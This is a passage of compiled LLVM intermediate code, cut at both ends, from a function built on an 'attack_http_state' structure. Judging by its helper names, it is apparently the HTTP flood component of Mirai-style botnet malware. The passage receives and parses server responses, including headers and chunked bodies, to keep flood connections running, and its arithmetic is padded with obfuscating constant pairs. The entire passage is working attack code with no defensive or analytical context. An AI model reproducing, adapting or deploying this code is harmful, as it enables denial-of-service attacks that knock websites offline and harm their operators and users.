  %2407 = zext i8 %2406 to i32
  %2408 = icmp eq i32 %2407, 7
  br i1 %2408, label %2409, label %2836

; <label>:2409:                                   ; preds = %2403
  br label %2410

; <label>:2410:                                   ; preds = %2834, %2409
  %2411 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2412 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2411, i32 0, i32 1
  %2413 = load i8, i8* %2412, align 4
  %2414 = zext i8 %2413 to i32
  %2415 = icmp ne i32 %2414, 7
  br i1 %2415, label %2416, label %2417

; <label>:2416:                                   ; preds = %2410
  br label %2835

; <label>:2417:                                   ; preds = %2410
  %2418 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2419 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2418, i32 0, i32 17
  %2420 = load i32, i32* %2419, align 4
  %2421 = icmp eq i32 %2420, 1024
  br i1 %2421, label %2422, label %2437

; <label>:2422:                                   ; preds = %2417
  %2423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2423, i32 0, i32 18
  %2425 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2424, i32 0, i32 0
  %2426 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2427 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2426, i32 0, i32 18
  %2428 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2427, i32 0, i32 0
  %2429 = getelementptr inbounds i8, i8* %2428, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2425, i8* %2429, i64 960, i32 1, i1 false)
  %2430 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2430, i32 0, i32 17
  %2432 = load i32, i32* %2431, align 4
  %2433 = add i32 %2432, -392077107
  %2434 = sub i32 %2433, 64
  %2435 = sub i32 %2434, -392077107
  %2436 = sub nsw i32 %2432, 64
  store i32 %2435, i32* %2431, align 4
  br label %2437

; <label>:2437:                                   ; preds = %2422, %2417
  %2438 = call i32* @__errno_location() #7
  store i32 0, i32* %2438, align 4
  %2439 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2440 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2439, i32 0, i32 0
  %2441 = load i32, i32* %2440, align 4
  %2442 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2443 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2442, i32 0, i32 18
  %2444 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2443, i32 0, i32 0
  %2445 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2446 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2445, i32 0, i32 17
  %2447 = load i32, i32* %2446, align 4
  %2448 = sext i32 %2447 to i64
  %2449 = getelementptr inbounds i8, i8* %2444, i64 %2448
  %2450 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2450, i32 0, i32 17
  %2452 = load i32, i32* %2451, align 4
  %2453 = sub i32 1024, 2029607502
  %2454 = sub i32 %2453, %2452
  %2455 = add i32 %2454, 2029607502
  %2456 = sub nsw i32 1024, %2452
  %2457 = sext i32 %2455 to i64
  %2458 = call i64 @recv(i32 %2441, i8* %2449, i64 %2457, i32 16384)
  %2459 = trunc i64 %2458 to i32
  store i32 %2459, i32* %12, align 4
  %2460 = load i32, i32* %12, align 4
  %2461 = icmp eq i32 %2460, 0
  br i1 %2461, label %2462, label %2464

; <label>:2462:                                   ; preds = %2437
  %2463 = call i32* @__errno_location() #7
  store i32 104, i32* %2463, align 4
  store i32 -1, i32* %12, align 4
  br label %2464

; <label>:2464:                                   ; preds = %2462, %2437
  %2465 = load i32, i32* %12, align 4
  %2466 = icmp eq i32 %2465, -1
  br i1 %2466, label %2467, label %2485

; <label>:2467:                                   ; preds = %2464
  %2468 = call i32* @__errno_location() #7
  %2469 = load i32, i32* %2468, align 4
  %2470 = icmp ne i32 %2469, 11
  br i1 %2470, label %2471, label %2484

; <label>:2471:                                   ; preds = %2467
  %2472 = call i32* @__errno_location() #7
  %2473 = load i32, i32* %2472, align 4
  %2474 = icmp ne i32 %2473, 11
  br i1 %2474, label %2475, label %2484

; <label>:2475:                                   ; preds = %2471
  %2476 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2477 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2476, i32 0, i32 0
  %2478 = load i32, i32* %2477, align 4
  %2479 = call i32 @close(i32 %2478)
  %2480 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2481 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2480, i32 0, i32 0
  store i32 -1, i32* %2481, align 4
  %2482 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2483 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2482, i32 0, i32 1
  store i8 0, i8* %2483, align 4
  br label %2484

; <label>:2484:                                   ; preds = %2475, %2471, %2467
  br label %2835

; <label>:2485:                                   ; preds = %2464
  %2486 = load i32, i32* %12, align 4
  %2487 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2488 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2487, i32 0, i32 17
  %2489 = load i32, i32* %2488, align 4
  %2490 = sub i32 0, %2486
  %2491 = sub i32 %2489, %2490
  %2492 = add nsw i32 %2489, %2486
  store i32 %2491, i32* %2488, align 4
  %2493 = load i32, i32* %27, align 4
  %2494 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2495 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2494, i32 0, i32 2
  store i32 %2493, i32* %2495, align 4
  br label %2496

; <label>:2496:                                   ; preds = %2833, %2485
  store i32 0, i32* %59, align 4
  %2497 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2498 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2497, i32 0, i32 14
  %2499 = load i32, i32* %2498, align 4
  %2500 = icmp sgt i32 %2499, 0
  br i1 %2500, label %2501, label %2702

; <label>:2501:                                   ; preds = %2496
  %2502 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2503 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2502, i32 0, i32 14
  %2504 = load i32, i32* %2503, align 4
  %2505 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2506 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2505, i32 0, i32 17
  %2507 = load i32, i32* %2506, align 4
  %2508 = icmp sgt i32 %2504, %2507
  br i1 %2508, label %2509, label %2513

; <label>:2509:                                   ; preds = %2501
  %2510 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2511 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2510, i32 0, i32 17
  %2512 = load i32, i32* %2511, align 4
  br label %2517

; <label>:2513:                                   ; preds = %2501
  %2514 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2515 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2514, i32 0, i32 14
  %2516 = load i32, i32* %2515, align 4
  br label %2517

; <label>:2517:                                   ; preds = %2513, %2509
  %2518 = phi i32 [ %2512, %2509 ], [ %2516, %2513 ]
  store i32 %2518, i32* %59, align 4
  %2519 = load i32, i32* %59, align 4
  %2520 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2521 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2520, i32 0, i32 14
  %2522 = load i32, i32* %2521, align 4
  %2523 = sub i32 0, %2519
  %2524 = add i32 %2522, %2523
  %2525 = sub nsw i32 %2522, %2519
  store i32 %2524, i32* %2521, align 4
  %2526 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2527 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2526, i32 0, i32 11
  %2528 = load i32, i32* %2527, align 4
  %2529 = icmp eq i32 %2528, 1
  br i1 %2529, label %2530, label %2701

; <label>:2530:                                   ; preds = %2517
  %2531 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2532 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2531, i32 0, i32 18
  %2533 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2532, i32 0, i32 0
  %2534 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2535 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2534, i32 0, i32 17
  %2536 = load i32, i32* %2535, align 4
  %2537 = call i8* @table_retrieve_val(i32 36, i32* null)
  %2538 = call i32 @util_memsearch(i8* %2533, i32 %2536, i8* %2537, i32 11)
  %2539 = icmp ne i32 %2538, -1
  br i1 %2539, label %2540, label %2700

; <label>:2540:                                   ; preds = %2530
  %2541 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2542 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2541, i32 0, i32 18
  %2543 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2542, i32 0, i32 0
  %2544 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2545 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2544, i32 0, i32 17
  %2546 = load i32, i32* %2545, align 4
  %2547 = call i8* @table_retrieve_val(i32 36, i32* null)
  %2548 = call i32 @util_memsearch(i8* %2543, i32 %2546, i8* %2547, i32 11)
  store i32 %2548, i32* %60, align 4
  %2549 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2550 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2549, i32 0, i32 18
  %2551 = load i32, i32* %60, align 4
  %2552 = sext i32 %2551 to i64
  %2553 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2550, i64 0, i64 %2552
  %2554 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2555 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2554, i32 0, i32 17
  %2556 = load i32, i32* %2555, align 4
  %2557 = load i32, i32* %60, align 4
  %2558 = add i32 %2556, -1127695904
  %2559 = sub i32 %2558, %2557
  %2560 = sub i32 %2559, -1127695904
  %2561 = sub nsw i32 %2556, %2557
  %2562 = call i32 @util_memsearch(i8* %2553, i32 %2560, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2562, i32* %61, align 4
  %2563 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2564 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2563, i32 0, i32 18
  %2565 = load i32, i32* %60, align 4
  %2566 = load i32, i32* %61, align 4
  %2567 = add i32 %2566, -1594442766
  %2568 = sub i32 %2567, 1
  %2569 = sub i32 %2568, -1594442766
  %2570 = sub nsw i32 %2566, 1
  %2571 = sub i32 %2565, 1220801552
  %2572 = add i32 %2571, %2569
  %2573 = add i32 %2572, 1220801552
  %2574 = add nsw i32 %2565, %2569
  %2575 = sext i32 %2573 to i64
  %2576 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2564, i64 0, i64 %2575
  store i8 0, i8* %2576, align 1
  %2577 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2578 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2577, i32 0, i32 15
  %2579 = load i32, i32* %2578, align 4
  %2580 = icmp slt i32 %2579, 5
  br i1 %2580, label %2581, label %2695

; <label>:2581:                                   ; preds = %2540
  %2582 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2583 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2582, i32 0, i32 18
  %2584 = load i32, i32* %60, align 4
  %2585 = sext i32 %2584 to i64
  %2586 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2583, i64 0, i64 %2585
  %2587 = call i32 @util_strlen(i8* %2586)
  %2588 = icmp slt i32 %2587, 128
  br i1 %2588, label %2589, label %2695

; <label>:2589:                                   ; preds = %2581
  %2590 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2591 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2590, i32 0, i32 16
  %2592 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2593 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2592, i32 0, i32 15
  %2594 = load i32, i32* %2593, align 4
  %2595 = sext i32 %2594 to i64
  %2596 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2591, i64 0, i64 %2595
  %2597 = getelementptr inbounds [128 x i8], [128 x i8]* %2596, i32 0, i32 0
  %2598 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2599 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2598, i32 0, i32 18
  %2600 = load i32, i32* %60, align 4
  %2601 = sext i32 %2600 to i64
  %2602 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2599, i64 0, i64 %2601
  %2603 = call i32 @util_strcpy(i8* %2597, i8* %2602)
  %2604 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2605 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2604, i32 0, i32 16
  %2606 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2607 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2606, i32 0, i32 15
  %2608 = load i32, i32* %2607, align 4
  %2609 = sext i32 %2608 to i64
  %2610 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2605, i64 0, i64 %2609
  %2611 = getelementptr inbounds [128 x i8], [128 x i8]* %2610, i32 0, i32 0
  %2612 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2613 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2612, i32 0, i32 16
  %2614 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2615 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2614, i32 0, i32 15
  %2616 = load i32, i32* %2615, align 4
  %2617 = sext i32 %2616 to i64
  %2618 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2613, i64 0, i64 %2617
  %2619 = getelementptr inbounds [128 x i8], [128 x i8]* %2618, i32 0, i32 0
  %2620 = call i32 @util_strlen(i8* %2619)
  %2621 = sext i32 %2620 to i64
  %2622 = getelementptr inbounds i8, i8* %2611, i64 %2621
  %2623 = call i32 @util_strcpy(i8* %2622, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %2624 = load i32, i32* %61, align 4
  %2625 = add i32 %2624, 464396679
  %2626 = add i32 %2625, 3
  %2627 = sub i32 %2626, 464396679
  %2628 = add nsw i32 %2624, 3
  %2629 = load i32, i32* %60, align 4
  %2630 = sub i32 %2629, 1538671466
  %2631 = add i32 %2630, %2627
  %2632 = add i32 %2631, 1538671466
  %2633 = add nsw i32 %2629, %2627
  store i32 %2632, i32* %60, align 4
  %2634 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2635 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2634, i32 0, i32 18
  %2636 = load i32, i32* %60, align 4
  %2637 = sext i32 %2636 to i64
  %2638 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2635, i64 0, i64 %2637
  %2639 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2640 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2639, i32 0, i32 17
  %2641 = load i32, i32* %2640, align 4
  %2642 = load i32, i32* %60, align 4
  %2643 = add i32 %2641, 37289692
  %2644 = sub i32 %2643, %2642
  %2645 = sub i32 %2644, 37289692
  %2646 = sub nsw i32 %2641, %2642
  %2647 = call i32 @util_memsearch(i8* %2638, i32 %2645, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2647, i32* %61, align 4
  %2648 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2649 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2648, i32 0, i32 18
  %2650 = load i32, i32* %60, align 4
  %2651 = load i32, i32* %61, align 4
  %2652 = add i32 %2651, 663930564
  %2653 = sub i32 %2652, 1
  %2654 = sub i32 %2653, 663930564
  %2655 = sub nsw i32 %2651, 1
  %2656 = sub i32 0, %2650
  %2657 = sub i32 0, %2654
  %2658 = add i32 %2656, %2657
  %2659 = sub i32 0, %2658
  %2660 = add nsw i32 %2650, %2654
  %2661 = sext i32 %2659 to i64
  %2662 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2649, i64 0, i64 %2661
  store i8 0, i8* %2662, align 1
  %2663 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2664 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2663, i32 0, i32 16
  %2665 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2666 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2665, i32 0, i32 15
  %2667 = load i32, i32* %2666, align 4
  %2668 = sext i32 %2667 to i64
  %2669 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2664, i64 0, i64 %2668
  %2670 = getelementptr inbounds [128 x i8], [128 x i8]* %2669, i32 0, i32 0
  %2671 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2672 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2671, i32 0, i32 16
  %2673 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2674 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2673, i32 0, i32 15
  %2675 = load i32, i32* %2674, align 4
  %2676 = sext i32 %2675 to i64
  %2677 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2672, i64 0, i64 %2676
  %2678 = getelementptr inbounds [128 x i8], [128 x i8]* %2677, i32 0, i32 0
  %2679 = call i32 @util_strlen(i8* %2678)
  %2680 = sext i32 %2679 to i64
  %2681 = getelementptr inbounds i8, i8* %2670, i64 %2680
  %2682 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2683 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2682, i32 0, i32 18
  %2684 = load i32, i32* %60, align 4
  %2685 = sext i32 %2684 to i64
  %2686 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2683, i64 0, i64 %2685
  %2687 = call i32 @util_strcpy(i8* %2681, i8* %2686)
  %2688 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2689 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2688, i32 0, i32 15
  %2690 = load i32, i32* %2689, align 4
  %2691 = add i32 %2690, -212140880
  %2692 = add i32 %2691, 1
  %2693 = sub i32 %2692, -212140880
  %2694 = add nsw i32 %2690, 1
  store i32 %2693, i32* %2689, align 4
  br label %2695

; <label>:2695:                                   ; preds = %2589, %2581, %2540
  %2696 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2697 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2696, i32 0, i32 14
  store i32 -1, i32* %2697, align 4
  %2698 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2699 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2698, i32 0, i32 1
  store i8 10, i8* %2699, align 4
  br label %2834

; <label>:2700:                                   ; preds = %2530
  br label %2701

; <label>:2701:                                   ; preds = %2700, %2517
  br label %2702

; <label>:2702:                                   ; preds = %2701, %2496
  %2703 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2704 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2703, i32 0, i32 14
  %2705 = load i32, i32* %2704, align 4
  %2706 = icmp eq i32 %2705, 0
  br i1 %2706, label %2707, label %2794

; <label>:2707:                                   ; preds = %2702
  %2708 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2709 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2708, i32 0, i32 13
  %2710 = load i32, i32* %2709, align 4
  %2711 = icmp eq i32 %2710, 1
  br i1 %2711, label %2712, label %2774

; <label>:2712:                                   ; preds = %2707
  %2713 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2714 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2713, i32 0, i32 18
  %2715 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2714, i32 0, i32 0
  %2716 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2717 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2716, i32 0, i32 17
  %2718 = load i32, i32* %2717, align 4
  %2719 = call i32 @util_memsearch(i8* %2715, i32 %2718, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %2720 = icmp ne i32 %2719, -1
  br i1 %2720, label %2721, label %2773

; <label>:2721:                                   ; preds = %2712
  %2722 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2723 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2722, i32 0, i32 18
  %2724 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2723, i32 0, i32 0
  %2725 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2726 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2725, i32 0, i32 17
  %2727 = load i32, i32* %2726, align 4
  %2728 = call i32 @util_memsearch(i8* %2724, i32 %2727, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2728, i32* %62, align 4
  %2729 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2730 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2729, i32 0, i32 18
  %2731 = load i32, i32* %62, align 4
  %2732 = add i32 %2731, 750864503
  %2733 = sub i32 %2732, 2
  %2734 = sub i32 %2733, 750864503
  %2735 = sub nsw i32 %2731, 2
  %2736 = sext i32 %2734 to i64
  %2737 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2730, i64 0, i64 %2736
  store i8 0, i8* %2737, align 1
  %2738 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2739 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2738, i32 0, i32 18
  %2740 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2739, i32 0, i32 0
  %2741 = load i32, i32* %62, align 4
  %2742 = call i32 @util_memsearch(i8* %2740, i32 %2741, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2743 = icmp ne i32 %2742, -1
  br i1 %2743, label %2744, label %2754

; <label>:2744:                                   ; preds = %2721
  %2745 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2746 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2745, i32 0, i32 18
  %2747 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2748 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2747, i32 0, i32 18
  %2749 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2748, i32 0, i32 0
  %2750 = load i32, i32* %62, align 4
  %2751 = call i32 @util_memsearch(i8* %2749, i32 %2750, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2752 = sext i32 %2751 to i64
  %2753 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2746, i64 0, i64 %2752
  store i8 0, i8* %2753, align 1
  br label %2754

; <label>:2754:                                   ; preds = %2744, %2721
  %2755 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2756 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2755, i32 0, i32 18
  %2757 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2756, i32 0, i32 0
  %2758 = call i32 @util_atoi(i8* %2757, i32 16)
  store i32 %2758, i32* %63, align 4
  %2759 = load i32, i32* %63, align 4
  %2760 = icmp eq i32 %2759, 0
  br i1 %2760, label %2761, label %2764

; <label>:2761:                                   ; preds = %2754
  %2762 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2763 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2762, i32 0, i32 1
  store i8 1, i8* %2763, align 4
  br label %2834

; <label>:2764:                                   ; preds = %2754
  %2765 = load i32, i32* %63, align 4
  %2766 = sub i32 %2765, 717631288
  %2767 = add i32 %2766, 2
  %2768 = add i32 %2767, 717631288
  %2769 = add nsw i32 %2765, 2
  %2770 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2771 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2770, i32 0, i32 14
  store i32 %2768, i32* %2771, align 4
  %2772 = load i32, i32* %62, align 4
  store i32 %2772, i32* %59, align 4
  br label %2773

; <label>:2773:                                   ; preds = %2764, %2712
  br label %2793

; <label>:2774:                                   ; preds = %2707
  %2775 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2776 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2775, i32 0, i32 17
  %2777 = load i32, i32* %2776, align 4
  %2778 = load i32, i32* %59, align 4
  %2779 = add i32 %2777, 1408066059
  %2780 = sub i32 %2779, %2778
  %2781 = sub i32 %2780, 1408066059
  %2782 = sub nsw i32 %2777, %2778
  %2783 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2784 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2783, i32 0, i32 14
  store i32 %2781, i32* %2784, align 4
  %2785 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2786 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2785, i32 0, i32 14
  %2787 = load i32, i32* %2786, align 4
  %2788 = icmp eq i32 %2787, 0
  br i1 %2788, label %2789, label %2792

; <label>:2789:                                   ; preds = %2774
  %2790 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2791 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2790, i32 0, i32 1
  store i8 1, i8* %2791, align 4
  br label %2834

; <label>:2792:                                   ; preds = %2774
  br label %2793

; <label>:2793:                                   ; preds = %2792, %2773
  br label %2794

; <label>:2794:                                   ; preds = %2793, %2702
  %2795 = load i32, i32* %59, align 4
  %2796 = icmp eq i32 %2795, 0
  br i1 %2796, label %2797, label %2798

; <label>:2797:                                   ; preds = %2794
  br label %2834

; <label>:2798:                                   ; preds = %2794
  %2799 = load i32, i32* %59, align 4
  %2800 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2801 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2800, i32 0, i32 17
  %2802 = load i32, i32* %2801, align 4
  %2803 = add i32 %2802, 743800362
  %2804 = sub i32 %2803, %2799
  %2805 = sub i32 %2804, 743800362
  %2806 = sub nsw i32 %2802, %2799
  store i32 %2805, i32* %2801, align 4
  %2807 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2808 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2807, i32 0, i32 18
  %2809 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2808, i32 0, i32 0
  %2810 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2811 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2810, i32 0, i32 18
  %2812 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2811, i32 0, i32 0
  %2813 = load i32, i32* %59, align 4
  %2814 = sext i32 %2813 to i64
  %2815 = getelementptr inbounds i8, i8* %2812, i64 %2814
  %2816 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2817 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2816, i32 0, i32 17
  %2818 = load i32, i32* %2817, align 4
  %2819 = sext i32 %2818 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2809, i8* %2815, i64 %2819, i32 1, i1 false)
  %2820 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2821 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2820, i32 0, i32 18
  %2822 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2823 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2822, i32 0, i32 17
  %2824 = load i32, i32* %2823, align 4
  %2825 = sext i32 %2824 to i64
  %2826 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2821, i64 0, i64 %2825
  store i8 0, i8* %2826, align 1
  %2827 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2828 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2827, i32 0, i32 17
  %2829 = load i32, i32* %2828, align 4
  %2830 = icmp eq i32 %2829, 0
  br i1 %2830, label %2831, label %2832

; <label>:2831:                                   ; preds = %2798
  br label %2834

; <label>:2832:                                   ; preds = %2798
  br label %2833

; <label>:2833:                                   ; preds = %2832
  br label %2496

; <label>:2834:                                   ; preds = %2831, %2797, %2789, %2761, %2695
  br label %2410

; <label>:2835:                                   ; preds = %2484, %2416
  br label %2888

; <label>:2836:                                   ; preds = %2403
